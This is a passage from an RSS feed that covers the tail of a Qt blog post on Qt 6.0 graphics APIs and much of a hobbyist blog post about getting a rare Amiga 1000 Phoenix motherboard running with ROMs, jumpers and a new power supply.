<p>Removing OpenGL-specifics from QQuickWindow, QSGTexture, and elsewhere. It should come as no surprise that functions like <em>GLuint textureId()</em>, <em>createTextureFromId(GLuint textureId, ...)</em>, or <em>setRenderTarget(GLuint fboId)</em> are now gone. Adopting (wrapping) an existing OpenGL texture, Vulkan image, Metal texture, or D3D11 texture, or accessing the underlying native texture for a QSGTexture is still perfectly possible, but now is done via a different set of APIs, such as <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-qsgvulkantexture.html">QSGVulkanTexture</a> and the <a href="https://doc-snapshots.qt.io/qt6-dev/qnativeinterface-sub-qtquick.html">other similar classes</a>, instances of which are <a href="https://doc-snapshots.qt.io/qt6-dev/qsgtexture.html?__hstc=233546881.8510e053e4fb66e1a58543a6e9886427.1603454017210.1603454017210.1603454017210.1&amp;__hssc=233546881.1.1603454017210&amp;__hsfp=1285229618#nativeInterface" rel="noopener">queryable from QSGTexure</a>.</p>
<ul>
<li>
<div><p>Integrating the application's own custom rendering with the graphics API that Qt Quick renders with is fully supported, not just for OpenGL, but also Vulkan, Metal, and D3D11. Due to their nature however, some of these APIs will need more than connecting to one single signal like beforeRendering() or afterRendering(). For example, we now also have <a href="https://doc-snapshots.qt.io/qt6-dev/qquickwindow.html#beforeRenderPassRecording">beforeRenderPassRecording()</a>. See the relevant section in the <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick-visualcanvas-scenegraph.html#mixing-scene-graph-and-the-native-graphics-api">scenegraph overview docs</a> for more details and links to examples. Finally, the number of native graphics resources queryable via <a href="https://doc-snapshots.qt.io/qt6-dev/qsgrendererinterface.html">QSGRendererInterface</a> has been extended, now covering Vulkan, Metal, and Direct 3D too.</p></div>
</li>
</ul>
</li>
<li>
<p>Extending support for redirecting the Qt Quick scene into an offscreen render target. <a href="https://www.qt.io/blog/%3Ehttps://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html">QQuickRenderControl</a> and the related infrastructure has been heavily enhanced. This was done not just to enable working with graphics APIs other than OpenGL the same way as in Qt 5 (for example, to render a Qt Quick scene into a Vulkan VkImage without an on-screen window), but also to enable integration with AR/VR frameworks and APIs such as <a href="https://www.khronos.org/openxr/">OpenXR</a> (in combination with any of Vulkan, D3D11, or OpenGL). Besides the slightly changed QQuickRenderControl interface, we now have a number of helper classes that improve the configurability of a QQuickWindow: <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendertarget.html">QQuickRenderTarget</a>, <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsdevice.html">QQuickGraphicsDevice</a>, and <a href="https://doc-snapshots.qt.io/qt6-dev/qquickgraphicsconfiguration.html">QQuickGraphicsConfiguration</a>. These are essential in scenarios where a more fine grained control is needed: integrating with APIs like OpenXR is not always straightforward when an existing rendering engine is involved, with a number of potential chicken-egg problems when it comes to the creation, initialization, and ownership of instance, device, and other graphics objects: Which Vulkan instance should Qt Quick use, or should it create a new one upon initializing the scenegraph for the first time? Which Vulkan physical device or DXGI adapter should Qt Quick pick, or just stay with the default? Which VkDevice extensions should be enabled in addition to what Qt itself needs? What 2D image/texture should rendering target, who creates that and when? The expectation is that Qt 6.0 will be well-prepared and providing the foundations for further exploring the world of AR/VR during the rest of the Qt 6.x series.</p>
</li>
</ul>
<h4>New approach to handling shader code in ShaderEffect</h4>
<p>A comprehensive example of the new approach to shader code in ShaderEffect is the Qt 6 port of the classic Qt 5 Cinematic Experience demo. <a href="https://github.com/alpqr/qt5-cinematic-experience" rel="noopener">(GitHub repo)</a> This version is ported to CMake and is fully functional with all graphics APIs, including all shader and particle effects.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png" alt="cinematic" width="702" srcset="https://www.qt.io/hs-fs/hubfs/cinematic.png?width=351&amp;name=cinematic.png 351w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=702&amp;name=cinematic.png 702w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1053&amp;name=cinematic.png 1053w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1404&amp;name=cinematic.png 1404w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=1755&amp;name=cinematic.png 1755w, https://www.qt.io/hs-fs/hubfs/cinematic.png?width=2106&amp;name=cinematic.png 2106w" sizes="(max-width: 702px) 100vw, 702px"></p>
<p>Looking at the QML source code, for example the code for the <a href="https://github.com/alpqr/qt5-cinematic-experience/blob/master/content/CurtainEffect.qml" rel="noopener">curtain effect </a>shows that indeed it has all inline GLSL strings removed.</p>
<p><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png" width="354" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=177&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 177w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=354&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 354w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=531&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 531w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=708&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 708w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=885&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 885w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-22-47-14-PM.png?width=1062&amp;name=image-png-Oct-19-2020-12-22-47-14-PM.png 1062w" sizes="(max-width: 354px) 100vw, 354px"></p>
<p>Instead, the vertex and fragment shaders now live as <a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener">ordinary files in the source tree</a>, not bundled with the application executable anymore.</p>
<p><a href="https://github.com/alpqr/qt5-cinematic-experience/tree/master/shaders" rel="noopener"><img src="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=300&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png" width="300" srcset="https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=150&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 150w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=300&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 300w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=450&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 450w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=600&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 600w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=750&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 750w, https://www.qt.io/hs-fs/hubfs/image-png-Oct-19-2020-12-24-06-07-PM.png?width=900&amp;name=image-png-Oct-19-2020-12-24-06-07-PM.png 900w" sizes="(max-width: 300px) 100vw, 300px"></a></p>
<p>It is now up to the build system and Qt Shader Tools to compile, reflect, and translate at build time - with the added benefit of shader compilation errors becoming proper build errors instead of …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d">https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d</a></em></p>]]>
            </description>
            <link>https://www.qt.io/blog/graphics-in-qt-6.0-qrhi-qt-quick-qt-quick-3d</link>
            <guid isPermaLink="false">hacker-news-small-sites-24905634</guid>
            <pubDate>Tue, 27 Oct 2020 09:09:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amiga 1000 Phoenix Project]]>
            </title>
            <description>
<![CDATA[
Score 91 | Comments 24 (<a href="https://news.ycombinator.com/item?id=24905247">thread link</a>) | @retrohax
<br/>
October 27, 2020 | https://retrohax.net/amiga-1000-project-phoenix-motherborad/ | <a href="https://web.archive.org/web/*/https://retrohax.net/amiga-1000-project-phoenix-motherborad/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-11666">

<div>
<p>… or failures are your friends :&gt;</p>
<p>&lt;INTRO&gt;</p>
<figure><img src="https://i0.wp.com/imgur.com/xzJXBgG.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/xzJXBgG.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>&lt;/INTRO&gt;</p>
<p>The story behind this whole post is a bit lengthy but I’ll try to be brief 🙂</p>
<p>In August of 2019, I’ve received an email from MrTrinsic. Back then, I didn’t yet know what is coming lol.</p>
<p>It turned out that MrTrinsic is a great Amiga enthusiast and he’d asked me to work on his Amiga 1000 … but no on a standard A1000 but with an Amiga 1000 Phoenix motherboard!</p>
<p>Amiga 1000 Phoenix Enhanced mobo is an extremely rare motherboard replacement for Amiga 1000. Some people think there were no more than 200 units manufactured, others say it was no more than 2000. I’ve no idea either but still, it is very rare so a magic smoke is not an option lol.</p>
<p>This motherboard is an awesome hack in itself and that is why MrTrinsic refers to it as DIVA 😀</p>
<p>Let me quote an excerpt from one of emails.</p>
<p><em>You should mention or point out more clearly that the Phoenix Board is a … DIVA!<br>It is a hack. Just look at the manual what kind of things you can modify and what kind of headers there are to change stuff.<br>The price is that it has an extremely bad signal quality. Plus, it lacks the Buster-Chip that the Amiga 2000 has.<br>The Phoenix is a bad version of the original A2000 from Braunschweig, which in itself was a hacked and beefed-up version of the A1000.<br>Plus, the Phoenix only has two layers. It’s a nightmare as we have seen.</em></p>
<p>It simply always has some problems like stability and compatibility issues which I’ve tried to sort out.</p>
<p>Phoenix mobo was developed in 1989/1990 by our fellow friends from Australia and was one of the very first crowd-funding campaigns! You can read/watch more on one of my fav websites -&gt; <a rel="noreferrer noopener" href="https://www.amigalove.com/viewtopic.php?t=476" target="_blank">www.amigalove.com</a></p>
<p>Hardware specs are available here -&gt;<a rel="noreferrer noopener" href="https://amiga.resource.cx/exp/phoenix" target="_blank"> amiga.resource.cx</a></p>
<h4>The plan</h4>
<p>Initially, MrTrinsic asked me to work on some external floppy replacements by Dell which I will cover in another post. Once I’ve figured out that floppy drive issue he’d decided we should start working on The Phoenix project.</p>
<p>At first, he’d send me a large box with gear that he wanted to have in this Amiga. I was like OMG! Not only Phoenix but the whole large project was about to begin!</p>
<p>The plan was to run lots of modern hardware add-ons with Amiga 1000 Phoenix and later try to squeeze it into a nice looking case, plus make it alive and stable.</p>
<p>The first package arrived and I was really excited by what I’ve seen.</p>
<p>Amiga 1000 Phoenix in an A1000 case with lots of mods and hacks already installed, plus, tons of other hardware mods still in boxes … and that was only for starters …</p>
<figure><img src="https://i0.wp.com/i.imgur.com/eTKSUuT.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/i.imgur.com/eTKSUuT.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/IIqmyaR.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/IIqmyaR.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/KYwUvJJ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/KYwUvJJ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/dRdZdns.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/dRdZdns.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/650o3wz.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/650o3wz.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/2lHWTqy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/2lHWTqy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/x8f24dT.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/x8f24dT.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/bw37Za0.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/bw37Za0.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/SQd4oOX.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/SQd4oOX.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Obviously, the original plan was to MAKE Amiga 1000 Phoenix GREAT AGAIN!</p>
<p>Jokes aside, the main goal was to run a graphics card along with <a href="http://wiki.icomp.de/wiki/ACA500plus" target="_blank" rel="noreferrer noopener">ACA500plus</a> + <a href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank" rel="noreferrer noopener">ACA1233n</a> accelerator card by iComp</p>
<p>On top of tons of other minor hardware mods, He’d also sent me two graphic cards – <a rel="noreferrer noopener" href="https://shop.mntmn.com/products/zz9000-for-amiga-preorder" target="_blank">ZZ9000 by MNT</a> and GBAPII++ by KryoFlux.</p>
<figure><img src="https://i1.wp.com/imgur.com/fvKi0VG.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/fvKi0VG.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/dg6QzfV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/dg6QzfV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<h4>Running it</h4>
<p>First things first. Phoenix motherboard is so rare that I first had to learn how it works and how it is all connected etc.</p>
<p>As it gave me a black screen at the very first run, I had to start learning about jumper settings and the board in general</p>
<p>Below, you can see a block diagram of particular parts location to give you an idea of what is where.</p>
<figure><img src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I would not move on quickly without MrTrinsics support. He’d pointed me to several sites and sent over some more info about the board itself. One of the most important documents I’ve received was <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/phoenix_jumpers_english.pdf" target="_blank">the jumper settings file</a> along with the <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/Phoenix.pdf" target="_blank">original manual</a>.</p>
<p>The above documents gave me the general idea of how things should work. The very first thing that I did was the removal of all added mods. I’ve then tried to run the A1K but still no luck – black screen. MrTrinsic then pointed me to jumper L35 which could cause such behavior if set incorrectly and bingo! It worked! </p>
<p>Since Phoenix has slots for more than one ROM chip, it is possible to install three KickStarts – 1.3. and 3.1 and third as a custom option. That was already done, along with a switch hack.</p>
<figure><img src="https://i2.wp.com/imgur.com/AtNPAf9.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/AtNPAf9.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/LIOJAzo.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/LIOJAzo.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>The problem was that Amiga wasn’t starting every single time. Instead, it booted every couple of times. My next move was to take it out and try running it outside of the case. This is where I’ve started noticing all the awesome texts on the PCB itself. I took PCB out started shooting pics of those texts and greetz for various hackers of that era.</p>
<figure><img src="https://i1.wp.com/imgur.com/SdWiBVf.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/SdWiBVf.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/5vhFvEe.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/5vhFvEe.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/JSecjDN.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/JSecjDN.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/ema2Gj3.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/ema2Gj3.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/iPLyCXN.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/iPLyCXN.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/dvlyOz0.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/dvlyOz0.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/dNT86JL.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/dNT86JL.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/JrX8CQy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/JrX8CQy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/fpooFLQ.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/fpooFLQ.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/Infqadj.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/Infqadj.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Next, I’ve checked for any obvious problems and when I was happy with this inspection, I’ve put it back to a case to simply avoid any accidental short circuits caused by beer-drinking ;P</p>
<p>I’ve decided that I will try to run it with only Indivision ECS2, and KryoFlux GBAPII++ inserted.</p>
<p>I’ve then located the switch setting for the first ROM and put an awesome<a href="http://www.diagrom.com/" target="_blank" rel="noreferrer noopener"> DiagROM by John “<em>Chucky</em>” Hertell</a> in a socket. Yeah, I know, it is a quite a large resistor ;P</p>
<figure><img src="https://i2.wp.com/imgur.com/1Xs3Ren.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/1Xs3Ren.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>To my surprise, it worked flawlessly and I was greeted by a known diag info and a menu a bit later.</p>
<figure><img src="https://i0.wp.com/imgur.com/OLe47z8.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/OLe47z8.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i0.wp.com/imgur.com/gxM4wyI.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/gxM4wyI.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/DevqDvV.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/DevqDvV.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/zu2QPUL.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/zu2QPUL.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Once it worked, I’ve figured that it might be as simple as a flaky ROM socket problem. I’ve put a 2.0 ROM in the place of DiagROM and Viola! It works!</p>
<figure><img src="https://i1.wp.com/imgur.com/CVzvAYd.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/CVzvAYd.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>When I’ve figured that part out, I could move on and start working on the alternative power supply which was …</p>
<h4>HDPLEX + Uber nice Amiga adapter</h4>
<p>MrTrinsic sent me this HQ HDPLEX Pico PSU but he’d also sent me a very cool DIY KIT – ATX2.0d-Amiga adapter which has super cool features like over-voltage/current protection outputs all needed voltages, and has additional floppy power outputs. Moreover, it generates a TICK signal which is good to have for testing.</p>
<p>However, it was a DIY KIT so I had to solder it all up first.</p>
<figure><img src="https://i1.wp.com/imgur.com/vjNBj6x.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/vjNBj6x.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/wWorjpy.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/wWorjpy.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/zLxusZT.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/zLxusZT.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/hQ4rfGh.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/hQ4rfGh.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/IQSyKPj.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/IQSyKPj.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/ksYAoZz.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/ksYAoZz.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i2.wp.com/imgur.com/iOkMKIS.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/iOkMKIS.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/kAsBdka.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/kAsBdka.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Combined together, it created an awesome and stable power source for this Amiga project.</p>
<figure><img src="https://i2.wp.com/imgur.com/AeB0dya.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/imgur.com/AeB0dya.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>All I needed to do next was to prepare all the wiring. That was a trivial job after taking some measurements. I’ve used wires from my Nissan Patrol spare wiring kit as these are thick (copper) and nice, hence the color mismatch ;P</p>
<figure><img src="https://i1.wp.com/imgur.com/XoLJW6m.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/XoLJW6m.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<figure><img src="https://i1.wp.com/imgur.com/X9KQOAo.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/X9KQOAo.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
